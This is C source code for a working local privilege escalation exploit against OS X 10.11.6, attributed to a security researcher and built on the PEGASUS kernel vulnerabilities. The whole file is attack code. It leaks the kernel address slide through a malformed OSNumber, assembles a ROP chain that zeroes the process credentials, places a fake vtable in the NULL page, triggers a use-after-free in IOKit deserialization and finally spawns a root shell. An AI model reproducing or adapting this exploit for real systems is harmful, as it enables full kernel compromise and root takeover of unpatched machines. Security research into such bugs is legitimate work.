/* ******************************************************************************************
 
 * Local privilege escalation for OS X 10.11.6 via PEGASUS

 * by Min(Spark) Zheng @ Team OverSky (twitter@SparkZheng)

 * Note: 1. If you want to test this exp, you should not install Security Update 2016-001 
            (like iOS 9.3.5 patch for PEGASUS). 
         2. I hardcoded a kernel address to calculate the kslide, it may be different on your mac.

 * Special Thanks to proteas, qwertyoruiop, windknown, aimin pan, jingle, liangchen, qoobee, etc.
 
 * Reference: 1. http://blog.pangu.io/cve-2016-4655/
              2. https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html
              3. https://bazad.github.io/2016/05/mac-os-x-use-after-free/
              4. https://github.com/kpwn/tpwn
 
  ***************************************************************************************** */

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>

#import "import.h"
#import "lsym_gadgets.h"

static uint64_t kslide=0;

#define kOSSerializeBinarySignature "\323\0\0"

enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
};

__attribute__((always_inline)) inline
lsym_slidden_kern_pointer_t lsym_slide_pointer(lsym_kern_pointer_t pointer) {
    if (!pointer) return pointer;
    return (lsym_slidden_kern_pointer_t) pointer + kslide;
}

__attribute__((always_inline)) static inline
uint64_t alloc(uint32_t addr, uint32_t sz) {
    vm_deallocate(mach_task_self(), (vm_address_t) addr, sz);
    vm_allocate(mach_task_self(), (vm_address_t*)&addr, sz, 0);
    while(sz--) *(char*)(addr+sz)=0;
    return addr;
}


int buildropchain()
{

  printf("building the rop chain...\n");
    
  //ropchain code from tpwn (https://github.com/kpwn/tpwn) and rootsh (https://github.com/bazad/rootsh)

  lsym_map_t* mapping_kernel=lsym_map_file("/System/Library/Kernels/kernel");

  kernel_fake_stack_t* stack = calloc(1,sizeof(kernel_fake_stack_t));
    
  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_current_proc");
  PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_proc_ucred");
  PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_posix_cred_get");
  PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
  PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, sizeof(int)*3)
  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_bzero");

  PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_thread_exception_return");

  vm_address_t payload_addr = 0;
  size_t size = 0x1000;
  /* In case we are re-executing, deallocate the NULL page. */
  vm_deallocate(mach_task_self(), payload_addr, size);
  
  kern_return_t kr = vm_allocate(mach_task_self(), &payload_addr, size, 0);
  if (kr != KERN_SUCCESS) {
    printf("error: could not allocate NULL page for payload\n");
    return 3;
  }

  uint64_t * vtable = (uint64_t *)payload_addr;

  /* Virtual method 4 is called in the kernel with rax set to 0. */
    vtable[0] = 0;
    vtable[1] = 0;
    vtable[2] = 0;
    vtable[3] = ROP_POP_RAX(mapping_kernel);
    vtable[4] = ROP_PIVOT_RAX(mapping_kernel);
    vtable[5] = ROP_POP_RAX(mapping_kernel);
    vtable[6] = 0;
    vtable[7] = ROP_POP_RSP(mapping_kernel);
    vtable[8] = (uint64_t)stack->__rop_chain;

    return 0;

}


void getkaslr()
{

  printf("getting kslide...\n");

  kern_return_t err,kr;
  io_iterator_t iterator;
  static mach_port_t service = 0;
  io_connect_t cnn = 0;
  io_object_t obj=0;
  io_iterator_t iter;
   mach_port_t master = 0, res;

    //<dict><key>min</key><number>0x4141414141414141</number></dict>
    uint32_t data[] = {
    0x000000d3,                         
    0x81000001,                         
    0x08000004, 0x006e696d,
    0x84000200,    //change the length of OSNumber
    0x41414141, 0x41414141
  };

  IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iterator);
  service = IOIteratorNext(iterator);


  kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data, sizeof(data), &err, &cnn);

  if (kr!=0)
  {
    printf("Cannot create service.\n");
    return;
  }
  
  IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
  io_object_t object = IOIteratorNext(iter);

  char search_str[100] = {0};

  sprintf(search_str, "pid %d", getpid());

  char buffer[0x200] = {0};

  while (object != 0)
  {
            uint32_t size = sizeof(buffer);
            if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buffer, &size) == 0)
            {
                if (strstr(buffer, search_str) != NULL)
                {
                    memset(buffer,0, 0x200);
                    size=0x300;
                    //bcopy( bytes, buf, len ); in io_registry_entry_get_property_bytes()
                    //Use crafted OSNumber to leak stack information of the kernel
                    if (io_registry_entry_get_property_bytes(object, "min", buffer, &size)==0)
                    {
                    //cacluate the kslide
                    kslide = *((unsigned long long*)&buffer[56])-0xFFFFFF80003934BF; //macOS 10.11.6 (15G31) hardcode
                    printf("kslide=0x%llx\n",kslide);
                    break;
                    }
                }
            }
            IOObjectRelease(object);            
            object = IOIteratorNext(iter);
  }
    
  if (object!=0)
    IOObjectRelease(object);
}

void expkernel()
{

  printf("exploit the kernel...\n");

  char * data = malloc(1024);
  uint32_t bufpos = 0;
  mach_port_t master = 0, res;
  kern_return_t kr;
  
  /* create header */
  memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
  bufpos += sizeof(kOSSerializeBinarySignature);

  //<dict><string>A</string><bool>true</bool><key>B</key><data>vtable data...</data><object>1</object></dict>

  *(uint32_t *)(data+bufpos) = kOSSerializeDictionary | 0x80000000 | 0x10; bufpos += 4; //0

  *(uint32_t *)(data+bufpos) = kOSSerializeString | 0x02; bufpos += 4;   //1 string "A"
  *(uint32_t *)(data+bufpos) = 0x00000041; bufpos += 4;
  *(uint32_t *)(data+bufpos) = kOSSerializeBoolean | 0x1; bufpos += 4;   //2 bool  "true"

  *(uint32_t *)(data+bufpos) = kOSSerializeSymbol | 0x2; bufpos += 4;   //3 symbol "B"
  *(uint32_t *)(data+bufpos) = 0x00000042; bufpos += 4;
  
  *(uint32_t *)(data+bufpos) = kOSSerializeData | 0x20; bufpos += 4;   //4  vtable
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;
  *(uint32_t *)(data+bufpos) = 0x00000000; bufpos += 4;

  *(uint32_t *)(data+bufpos) = kOSSerializeObject | 0x1; bufpos += 4; //5  Object refer to string "A"

  host_get_io_master(mach_host_self(), &master);

  kr = io_service_get_matching_services_bin(master, data, bufpos, &res); //trigger the UAF vul

  free(data);

}


int main(int argc, char * argv[])
{

  printf("*********************************************************************\n");
  printf("Local privilege escalation for OS X 10.11.6 via PEGASUS \n");
  printf("by Min(Spark) Zheng @ Team OverSky (twitter@SparkZheng)\n");
  printf("*********************************************************************\n");

  getkaslr();

  if (kslide==0)
    return -1;
 
  sleep(1);
   
  if (buildropchain()!=0)
    return -1;
  
  sleep(1);

  expkernel();

  argv[0] = "/bin/sh";
  execve(argv[0], argv, NULL);
  printf("error: could not exec shell\n");

  return 0;

}
